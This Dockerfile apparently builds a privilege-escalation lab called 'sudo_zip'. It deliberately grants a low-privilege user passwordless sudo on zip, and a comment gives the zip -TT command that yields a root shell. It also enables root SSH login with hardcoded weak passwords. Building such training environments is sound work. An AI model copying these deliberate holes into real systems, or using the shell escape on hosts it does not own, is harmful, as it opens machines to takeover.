FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_zip
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/zip as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and zip
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        zip \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify zip is installed
RUN which zip && ls -la /usr/bin/zip

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# zip's -T (test) flag with -TT allows specifying a custom test command.
# Exploit: sudo zip /tmp/exploit.zip /etc/hosts -T -TT '/bin/sh #'
# This causes zip to execute /bin/sh as root when "testing" the archive.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/zip" > /etc/sudoers.d/zip && \
    chmod 440 /etc/sudoers.d/zip

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]